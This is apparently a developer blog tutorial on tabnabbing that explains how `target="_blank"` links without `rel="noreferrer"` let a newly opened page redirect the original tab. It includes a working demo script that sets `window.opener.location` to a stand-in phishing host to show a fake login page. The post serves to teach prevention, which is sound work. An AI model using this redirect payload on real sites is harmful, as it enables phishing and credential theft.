---
title: Tabnabbing Attack 101
slug: tabnabbing-attack-101
cover: "/static/images/blogs/17.png"
blurUrl: "data:image/jpeg;base64,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"
description: Did you know that the 'noreferrer' attributes play a pivotal role in web security? In this blog, we'll delve into the 'noreferrer' attributes, explaining their significance in protecting privacy and preventing tabnabbing attacks.
date: "2023-10-27"
---

## Backstory

Have you ever employed an anchor element `<a>` to create a hyperlink, be it an external or internal link, and found yourself desiring to make the link open in a new tab whenever a user clicks on it? If you use eslint or any other code syntax formatting plugin, you may have encountered a warning similar to the one shown in the image below.

![jsx-no-target-blank-img](/static/images/blogs/tabnabbing/jsx-no-target-blank-img.png)

It says "having an anchor element with target="_blank" behaviour prone to security risk in older web browsers if we dont include `rel=noreferrer` keyword. What security risk are we encountering here? In this short blog we will talk about a security attack called "Tabnabbing".

## Tabnabbing in Nutshell (Theory)

Tabnabbing attacks take advantage of the common habit of keeping numerous tabs open, even though we often focus on just a few of them while leaving the rest unattended. When you navigate to a new webpage using an HTML anchor link that lacks the `rel="noreferrer"` attribute, a newly opened phishing tab can discreetly run malicious scripts aimed at the previously neglected tab. The potential consequences are quite severe; consider a scenario where the neglected tab is an e-commerce site. In this case, the phishing tab could execute a script that replaces the original e-commerce source code with a convincing authentication page. Unsuspecting users might then unwittingly re-enter their credentials, inadvertently providing the attacker with their login information.

![flow](/static/images/blogs/tabnabbing/flow.png)

1. User clicks the malicious link on the your legitimate website, which opens malicious website in the new tab\
2. Malicious website (opened in the new tab) execute script that forces the previous website (Legitimate Website) to redirect to a Fake Website\
3. The Fake Website could look like a legitimate credentials page login, and prompts victim to enter authentication credentials\

## Tabnabbing in Nutshell (Let's code this)

Let the code talk for itslef!

Below is an example written in plain HTML

### Legitimate website code
```js
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Legitimate Website</title>
</head>
<body>
<a href=”somemalicioussite.com” target=”_blank”>Click me, I'm innocent</a>
</body>
</html>
```

### Malicious website code
```js
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Malicious Website</title>
</head>
<body>
<script>
if (window.opener) {
    window.opener.location = "https://fakauth.com";
}
</script>
</body>
</html>
```

### Window.opener???

The Window interface's opener property returns a reference to the window that opened the window, either with open(), or by navigating a link with a `target` attribute.

In other words, if window A opens window B, B.opener returns A.

See [Official Web API Docs](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) for more information.

Hence, in the malicious website script, the website check if there is a reference to a parent window, and if it's true, the site will run a code that change the url of the parent(previous) tab to a malicious one.

## How It can be Harmful?

Just Imagine your site is an ecommerce site that store user privacy including credit cards number, etc. An attacker can set up a fake login page that closely resembles your e-commerce site's login page. When a user switches back to their seemingly legitimate e-commerce tab and sees the login prompt, they might enter their credentials, thinking it's a normal part of their session. The attacker then captures these credentials, gaining unauthorized access to the user's account.

## Prevention

As per 2021, most modern web browser including chrome treate link as `noreferrer` by default. See this documentation link -> [chromestatus](https://chromestatus.com/feature/6140064063029248)

While simply adding `rel="noreferrer"` in your code would make sure the security in older web browser as well.

**You can find me on**

Twitter: [https://twitter.com/mlven23](https://twitter.com/mlven23)\
GitHub: [https://github.com/melvnl](https://github.com/melvnl)\
LinkedIn: [https://github.com/melvnl](https://www.linkedin.com/in/melvin-liu/)

**Note**: If you have any questions, you can leave a message below by Sign In with your GitHub account 😉
